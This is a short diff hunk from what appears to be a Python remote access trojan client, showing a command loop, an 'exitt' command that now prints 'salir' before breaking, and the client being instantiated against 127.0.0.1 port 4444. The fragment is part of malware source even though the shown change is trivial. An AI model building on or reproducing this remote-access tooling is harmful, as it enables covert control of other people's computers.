@@ -601,6 +601,7 @@ User: {os.getlogin()}
                     self.errorsend()
 
             elif command == 'exitt':
+                print ("salir");
                 break
 
 rat = RAT_CLIENT('127.0.0.1', 4444)
